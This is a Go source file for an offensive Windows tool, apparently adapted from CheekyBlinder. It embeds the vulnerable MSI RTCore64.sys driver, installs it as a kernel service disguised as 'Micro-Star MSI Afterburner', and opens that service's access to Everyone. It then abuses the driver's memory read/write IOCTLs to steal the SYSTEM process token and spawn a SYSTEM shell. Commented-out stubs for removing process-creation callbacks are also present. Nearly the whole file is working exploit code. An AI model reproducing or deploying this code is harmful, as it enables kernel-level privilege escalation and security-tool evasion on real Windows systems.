package main

// https://github.com/br-sn/CheekyBlinder - multiple code snippets were re-used here
//go:generate go run $GOROOT/src/syscall/mksyscall_windows.go -output syscallwin.go main.go

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

//go:embed resources/NtoskrnlOffsets.csv
var ntoskrnlOffsets string

//go:embed resources/RTCore64.sys
var binfile []byte

type (
	DWORD   uint32
	DWORD64 uint64
	LPVOID  uintptr
	LPDWORD *uint32
	LPCSTR  *int8
	LPCWSTR *int16
	HANDLE  uintptr
	BYTE    byte
)
type SECURITY_ATTRIBUTES struct {
	Length             uint32
	SecurityDescriptor unsafe.Pointer
	InheritHandle      uint32 // bool value
}

//sys EnumDeviceDrivers(lpImageBase uintptr, cb uint32, lpcbNeeded *uint32) (ret bool) = psapi.EnumDeviceDrivers
//sys LoadLibraryW(lpLibFileName string) (handle uintptr, err error) = kernel32.LoadLibraryW
//sys GetProcAddress(hModule uintptr,lpProcName string) (address uintptr, err error) = kernel32.GetProcAddress
//sys FreeLibrary(hLibModule uintptr) (ret bool) = kernel32.FreeLibrary
//sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (ret bool) = kernel32.DeviceIoControl
//sys CreateFile(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, lpSecurityAttributes *SECURITY_ATTRIBUTES, dwCreationDisposition uint32, dwFlagsAndAttributes uint32, hTemplateFile uintptr) (handle uintptr, err error) = kernel32.CreateFile
//sys CloseHandle(hObject HANDLE) (ret bool) = kernel32.CloseHandle
//sys GetLastError() (ret uint32 ) = kernel32.GetLastError
//sys RegGetValueW(hkey int,lpSubKey string, lpValue string, dwFlags uint32, pdwType *uint32, pvData uintptr, pcbData *uint32) (ret uint32, err error) = advapi32.RegGetValueW
//sys OpenSCManagerW(lpMachineName string, lpDatabaseName string, dwDesiredAccess uint32) (handle uintptr, err error) = advapi32.OpenSCManagerW
//sys OpenServiceW(hSCManager uintptr, lpServiceName string, dwDesiredAccess uint32) (handle uintptr, err error) = advapi32.OpenServiceW
//sys CreateServiceW(hSCManager uintptr, lpServiceName string, lpDisplayName string, dwDesiredAccess uint32, dwServiceType uint32, dwStartType uint32, dwErrorControl uint32, lpBinaryPathName string, lpLoadOrderGroup string, lpdwTagId string, lpDependencies string, lpServiceStartName string, lpPassword string) (handle uintptr, err error) = advapi32.CreateServiceW
//sys DeleteService(hService uintptr) (ret bool) = advapi32.DeleteService
//sys StartServiceW(hService uintptr, dwNumServiceArgs uint32, lpServiceArgVectors *int16) (ret bool) = advapi32.StartServiceW
//sys CloseServiceHandle(hSCObject uintptr) (ret bool) = advapi32.CloseServiceHandle

//sys QueryServiceObjectSecurity(hService uintptr, dwSecurityInformation uint32, lpSecurityDescriptor uintptr, cbBufSize uint32, pcbBytesNeeded *uint32) (ret bool) = advapi32.QueryServiceObjectSecurity
//sys BuildSecurityDescriptorW(pOwner unsafe.Pointer, pGroup unsafe.Pointer, cCountOfAccessEntries int64, pListOfAccessEntries *windows.EXPLICIT_ACCESS, cCountOfAuditEntries int64, pListOfAuditEntries *windows.EXPLICIT_ACCESS, pOldSD unsafe.Pointer, pSizeNewSD uint32, pNewSD *uintptr) (ret uint32) = advapi32.BuildSecurityDescriptorW
//sys SetServiceObjectSecurity(hService uintptr, dwSecurityInformation uint32, lpSecurityDescriptor uintptr) (ret bool) = advapi32.SetServiceObjectSecurity
//sys LocalFree(hMem uintptr) (ret bool) = advapi32.LocalFree
//sys SetEntriesInAclW(cCountOfExplicitEntries uint32, pListOfExplicitEntries *windows.EXPLICIT_ACCESS, OldAcl *windows.ACL, NewAcl **windows.ACL) (ret uint32) = advapi32.SetEntriesInAclW

// windows.ControlService()
// windows.CloseServiceHandle()
// windows.StartService()
// windows.CreateService()
// windows.GetLastError()
// windows.OpenSCManager()
// windows.LoadLibrary()

/*
from CheekyBlinder
type Offsets struct {
	Process  DWORD64
	Image    DWORD64
	Thread   DWORD64
	Registry DWORD64
}
*/

type Offsets struct {
	UniqueProcessIdOffset    DWORD64
	ActiveProcessLinksOffset DWORD64
	TokenOffset              DWORD64
	SignatureLevelOffset     DWORD64
}

type Rtcore64MemoryRead struct {
	Pad0     [8]byte
	Address  DWORD64
	Pad1     [8]byte
	ReadSize DWORD
	Value    DWORD
	Pad3     [16]byte
}

const (
	RTCORE64_MEMORY_READ_CODE     uint32 = 0x80002048
	RTCORE64_MEMORY_WRITE_CODE    uint32 = 0x8000204c
	INVALID_HANDLE_VALUE          HANDLE = ^HANDLE(0)
	ERROR_SERVICE_DOES_NOT_EXIST  uint32 = 1060
	ERROR_SERVICE_ALREADY_RUNNING uint32 = 1056
	ERROR_INSUFFICIENT_BUFFER     uint32 = 122
	ERROR_SUCCESS                 uint32 = 0
	SERVICE_ALL_ACCESS                   = windows.SERVICE_QUERY_STATUS |
		windows.SERVICE_QUERY_CONFIG |
		windows.SERVICE_INTERROGATE |
		windows.SERVICE_ENUMERATE_DEPENDENTS |
		windows.SERVICE_PAUSE_CONTINUE |
		windows.SERVICE_START |
		windows.SERVICE_STOP |
		windows.SERVICE_USER_DEFINED_CONTROL |
		windows.READ_CONTROL
)

type SECURITY_DESCRIPTOR struct {
	Revision byte
	Sbz1     byte
	Control  uint16
	Owner    uintptr
	Group    uintptr
	Sacl     uintptr
	Dacl     uintptr
}

/*
from CheekyBlinder
func getVersionOffsets() Offsets {
	winver := w32.RegGetString(w32.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
	fmt.Printf("[+] Windows Version %s Found!\n", winver)
	switch winver {
	case "1909":
		return Offsets{0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48}
	case "2004":
		return Offsets{0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48}
	default:
		fmt.Println("[!] Version Offsets Not Found!")
		return Offsets{0, 0, 0, 0}
	}
} */

func RegGetString(hKey int, subKey string, value string) string {
	var RRF_RT_REG_SZ uint32 = 0x00000002
	var bufLen uint32
	RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, 0, &bufLen)
	if bufLen == 0 {
		return ""
	}
	buf := make([]uint16, bufLen)
	ret, _ := RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, uintptr(unsafe.Pointer(&buf[0])), &bufLen)
	if ret != ERROR_SUCCESS {
		return ""
	}
	return syscall.UTF16ToString(buf)
}

func getVersionOffsets() Offsets {
	//PPL Killer
	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
	fmt.Printf("[+] Windows Version %s Found!\n", winver)
	switch winver {
	case "1607":
		return Offsets{0x02e8, 0x02f0, 0x0358, 0x06c8}
	case "1803":
	case "1809":
		return Offsets{0x02e0, 0x02e8, 0x0358, 0x06c8}
	case "1903":
	case "1909":
		return Offsets{0x02e8, 0x02f0, 0x0360, 0x06f8}
	case "2004":
	case "2009":
		return Offsets{0x0440, 0x0448, 0x04b8, 0x0878}
	default:
		fmt.Println("[!] Version Offsets Not Found!")
		//os.Exit(-1)
		return Offsets{0, 0, 0, 0}
	}
	return Offsets{0, 0, 0, 0}

}

func getDriverHandle() HANDLE {
	name, err := syscall.UTF16PtrFromString("\\\\.\\RTCore64")
	if err != nil {
		panic(err)
	}
	device, err := windows.CreateFile(name, windows.GENERIC_READ|windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if err != nil {
		fmt.Println("[!] Unable to obtain a handle to the device object")
		return HANDLE(device)
	} else {
		fmt.Printf("[+] Device object handle obtained: %x", device)
		return HANDLE(device)
	}
}

func findkrnlbase() DWORD64 {
	cbNeeded := uint32(0)
	var drivers [1024]DWORD64
	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
		return drivers[0]
	}
	//need error response
	return drivers[0]
}
func getFunctionAddress(fnc string) DWORD64 {
	ntoskrnlbaseaddress := findkrnlbase()
	ntoskrnl, _ := LoadLibraryW("ntoskrnl.exe")
	ntoskrnlProcaddress, _ := GetProcAddress(uintptr(ntoskrnl), fnc)
	offset := DWORD64(ntoskrnlProcaddress) - DWORD64(ntoskrnl)
	address := ntoskrnlbaseaddress + offset
	FreeLibrary(ntoskrnl)
	fmt.Println(address)
	return address
}

func writeMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64, val DWORD) {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	memRead.Value = val
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_WRITE_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
}

func writeMemoryDWORD64(device HANDLE, adr DWORD64, val DWORD64) {
	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
}

func readMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64) DWORD {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_READ_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
	return memRead.Value
}
func readMemoryDWORD(device HANDLE, adr DWORD64) DWORD64 {
	return DWORD64(readMemoryPrimitive(device, 4, adr))
}

func readMemoryDWORD64(device HANDLE, adr DWORD64) DWORD64 {
	return (readMemoryDWORD(device, adr+4) << 32) | readMemoryDWORD(device, adr)
}

func patternSearch(device HANDLE, s DWORD64, e DWORD64, p DWORD64) DWORD64 {
	r := int(e - s)
	for i := 0; i < r; i++ {
		ct := readMemoryDWORD64(device, s+DWORD64(i))
		if ct == p {
			return s + DWORD64(i)
		}
	}
	return 0
}

/*
from CheekyBlinder
func findProcessCallbackRoutine(r string) {
	offsets := getVersionOffsets()
	device := getDriverHandle()
	addr1 := getFunctionAddress("PsSetCreateProcessNotifyRoutine")
	addr2 := getFunctionAddress("IoCreateDriver")
	// paddr := patternSearch(device, addr1, addr2, offsets.Process)
	// offset := readMemoryDWORD(device, paddr-0x0c)

} */

func TrusteeValueFromSID(sid *windows.SID) windows.TrusteeValue {
	return windows.TrusteeValue(unsafe.Pointer(sid))
}

func SIDFromTrusteeValueFromSID(t *windows.TrusteeValue) *windows.SID {
	return (*windows.SID)(unsafe.Pointer(t))
}

func serviceAddEveryoneAccess(srvName string) bool {
	status := false
	trustee := windows.TRUSTEE{}
	trustee.MultipleTrustee = nil
	trustee.MultipleTrusteeOperation = windows.NO_MULTIPLE_TRUSTEE
	trustee.TrusteeForm = windows.TRUSTEE_IS_SID
	trustee.TrusteeType = windows.TRUSTEE_IS_WELL_KNOWN_GROUP
	trustee.TrusteeValue = 0

	forEveryoneACL := windows.EXPLICIT_ACCESS{}
	forEveryoneACL.AccessPermissions = SERVICE_ALL_ACCESS
	forEveryoneACL.AccessMode = windows.SET_ACCESS
	forEveryoneACL.Inheritance = windows.NO_INHERITANCE
	forEveryoneACL.Trustee = trustee

	oldSd, err := windows.GetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION)
	if err != nil {
		panic(err)
	}
	stringSID, err := syscall.UTF16PtrFromString("S-1-1-0")
	if err != nil {
		panic(err)
	}
	var sid *windows.SID
	err = windows.ConvertStringSidToSid(stringSID, &sid)
	if err != nil {
		panic(err)
	}
	da, _, _ := oldSd.DACL()
	forEveryoneACL.Trustee.TrusteeValue = TrusteeValueFromSID(sid)
	var nacl *windows.ACL
	SetEntriesInAclW(1, &forEveryoneACL, da, &nacl)
	err = windows.SetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION, nil, nil, nacl, nil)
	if err != nil {
		println(err)
		panic(err)
	}
	status = true
	windows.FreeSid(sid)
	return status
}

func serviceInstall(srvName string, dName string, bPath string, srvType uint32, startType uint32, startIt bool) uint32 {
	var hS windows.Handle
	//var hSc uintptr = 0
	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		panic(err)
	}
	hSc, err := windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT|windows.SC_MANAGER_CREATE_SERVICE)
	if err != nil {
		fmt.Println("OpenSCManager(create)")
		return uint32(err.(syscall.Errno))
	}
	serviceName, err := syscall.UTF16PtrFromString(srvName)
	if err != nil {
		panic(err)
	}
	displayName, err := syscall.UTF16PtrFromString(dName)
	if err != nil {
		panic(err)
	}
	binPath, err := syscall.UTF16PtrFromString(bPath)
	if err != nil {
		panic(err)
	}
	hS, err = windows.OpenService(hSc, serviceName, uint32(windows.SERVICE_START))
	if err == nil {
		fmt.Printf("[+] '%s' service already registered\n", srvName)
	} else {
		if uint32(err.(syscall.Errno)) == ERROR_SERVICE_DOES_NOT_EXIST {
			fmt.Printf("[*] '%s' service not present\n", srvName)
			hS, err = windows.CreateService(hSc, serviceName, displayName, windows.READ_CONTROL|windows.WRITE_DAC|windows.SERVICE_START, srvType,
				startType, windows.SERVICE_ERROR_NORMAL, binPath, nil, nil, nil, nil, nil)
			if err == nil {
				fmt.Printf("[+] '%s' service successfully registered\n", srvName)
				if serviceAddEveryoneAccess(srvName) {
					fmt.Printf("[+] '%s' service ACL to everyone\n", srvName)
				} else {
					fmt.Printf("[!] '%s' ServiceAddEveryoneAccess\n", srvName)
				}
			} else {
				fmt.Println("CreateService")
			}
		} else {
			fmt.Println("OpenService")
		}
	}

	if uintptr(hS) != 0 {
		if startIt {
			err = windows.StartService(hS, 0, nil)
			if err == nil {
				fmt.Printf("[+] '%s' service started\n", srvName)
			} else if uint32(err.(syscall.Errno)) == ERROR_SERVICE_ALREADY_RUNNING {
				fmt.Printf("[*] '%s' service already started\n", srvName)
			} else {
				fmt.Println("StartService")
				return uint32(err.(syscall.Errno))
			}
		}
		windows.CloseServiceHandle(windows.Handle(hSc))
	}
	windows.CloseServiceHandle(windows.Handle(hSc))

	return 0
}

func serviceGenericControl(srvName string, dwDesiredAccess uint32, dwControl uint32, ptrServiceStatus *windows.SERVICE_STATUS) (bool, error) {
	status := false
	var srvStatus windows.SERVICE_STATUS
	var hS windows.Handle
	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		return status, err
	}
	hSc, err := windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return status, err
	}
	if uintptr(hSc) != 0 {
		serviceName, err := syscall.UTF16PtrFromString(srvName)
		if err != nil {
			return status, err
		}
		hS, err = windows.OpenService(hSc, serviceName, dwDesiredAccess)
		if err != nil {
			return status, err
		}
		if uintptr(hS) != 0 {
			err = windows.ControlService(hS, dwControl, &srvStatus)
			if err != nil {
				return status, err
			}
			windows.CloseServiceHandle(hS)
			status = true
		}
		windows.CloseServiceHandle(hSc)
	}
	return status, nil
}

func serviceUninstall(srvName string, cnt int) bool {
	deleted := false
	var hSC windows.Handle
	var hS windows.Handle
	var srvStatus windows.SERVICE_STATUS
	if cnt > 3 {
		fmt.Printf("[!] Reached maximun number of attempts (3) to uninstall the service '%s'\n", srvName)
		return false
	}
	status, err := serviceGenericControl(srvName, windows.SERVICE_STOP, windows.SERVICE_CONTROL_STOP, nil)

	if status {
		fmt.Printf("[+] '%s' service stopped\n", srvName)
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_DOES_NOT_EXIST {
		fmt.Printf("[+] '%s' service does not exeist\n", srvName)
		return true
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_NOT_ACTIVE {
		fmt.Printf("[+] '%s' service not running\n", srvName)
	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_CANNOT_ACCEPT_CTRL {
		fmt.Printf("[*] '%s' service cannot accept control messages at this time, waiting...\n", srvName)
		time.Sleep(1000)
	} else {
		fmt.Println("ServiceUninstall")
		time.Sleep(1000)
		return serviceUninstall(srvName, cnt+1)
	}

	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
	if err != nil {
		panic(err)
	}
	hSC, err = windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT)
	if err != nil {
		panic(err)
	}
	if uintptr(hSC) != 0 {
		serviceName, err := syscall.UTF16PtrFromString(srvName)
		if err != nil {
			panic(err)
		}
		hS, err = windows.OpenService(hSC, serviceName, windows.SERVICE_QUERY_STATUS|windows.DELETE)
		if err != nil {
			windows.CloseServiceHandle(hSC)
			panic(err)
		}
		if uintptr(hS) != 0 {
			err = windows.QueryServiceStatus(hS, &srvStatus)
			if err != nil {
				println(uint32(err.(syscall.Errno)))
				windows.CloseServiceHandle(hSC)
				panic(err)
			}
			if !(srvStatus.CurrentState == windows.SERVICE_STOPPED) {
				windows.CloseServiceHandle(hS)
				windows.CloseServiceHandle(hSC)
				time.Sleep(1000)
				return serviceUninstall(srvName, cnt+1)
			} else {
				err = windows.DeleteService(hS)
				if err != nil {
					panic(err)
				}
				deleted = true
				windows.CloseServiceHandle(hSC)
			}
		}
		windows.CloseServiceHandle(hSC)
	}
	if !deleted {
		time.Sleep(1000)
		return serviceUninstall(srvName, cnt+1)
	}
	return deleted
}

func installVulnDriver() {
	currentDir, _ := os.Getwd()
	binPath := currentDir + "/RTCore64.sys"
	os.WriteFile(binPath, binfile, 0777)
	status := serviceInstall("RTCore64", "Micro-Star MSI Afterburner", binPath, windows.SERVICE_KERNEL_DRIVER, windows.SERVICE_AUTO_START, true)
	if status == 0x05 {
		fmt.Println("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?")
	}
}

func uninstallVulnDriver() {
	status := serviceUninstall("RTCore64", 0)
	if !status {
		fmt.Println("ServiceUninstall")
	}

}

func makeSystem() {
	cpid := DWORD64(os.Getpid())
	offsets := getVersionOffsets()
	device := getDriverHandle()
	addr1 := getFunctionAddress("PsInitialSystemProcess")
	addr2 := readMemoryDWORD64(device, addr1)
	fmt.Printf("[*] PsInitialSystemProcess address: %x\n", addr2)

	//get system process token
	token := readMemoryDWORD64(device, addr2+offsets.TokenOffset) &^ 15
	fmt.Printf("[*] System process token: %x\n", token)

	processHead := addr2 + offsets.ActiveProcessLinksOffset
	currentProcessAddress := processHead
	for {
		processAddress := currentProcessAddress - offsets.ActiveProcessLinksOffset
		uniqueProcessId := readMemoryDWORD64(device, processAddress+offsets.UniqueProcessIdOffset)
		if uniqueProcessId == cpid {
			break
		}
		currentProcessAddress = readMemoryDWORD64(device, processAddress+offsets.ActiveProcessLinksOffset)
		if currentProcessAddress == processHead {
			break
		}
	}
	currentProcessAddress -= offsets.ActiveProcessLinksOffset
	fmt.Printf("[*] Current process address: %x\n", currentProcessAddress)

	currentProcessFastToken := readMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset)
	currentProcessTokenReferenceCounter := currentProcessFastToken & 15
	currentProcessToken := currentProcessFastToken &^ 15
	fmt.Printf("[*] Current process token: %x\n", currentProcessToken)
	fmt.Println("[*] Stealing System process token ...")
	writeMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset, currentProcessTokenReferenceCounter|token)
	CloseHandle(device)

	fmt.Println("[*] Spawning new shell ...")
	cmd := exec.Command("c:\\windows\\system32\\cmd.exe")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Run()
}

func main() {
	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"

	if len(os.Args) < 2 {
		fmt.Println(usage)
	} else if os.Args[1] == "/proc" {
		//findProcessCallbackRoutine("")
	} else if os.Args[1] == "/deproc" && len(os.Args) == 3 {
		//r := os.Args[2]
		//findProcessCallbackRoutine(r)
	} else if os.Args[1] == "/systemcmd" {
		makeSystem()
	} else if os.Args[1] == "/install" {
		installVulnDriver()
	} else if os.Args[1] == "/uninstall" {
		uninstallVulnDriver()
	} else {
		fmt.Println(usage)
	}
}
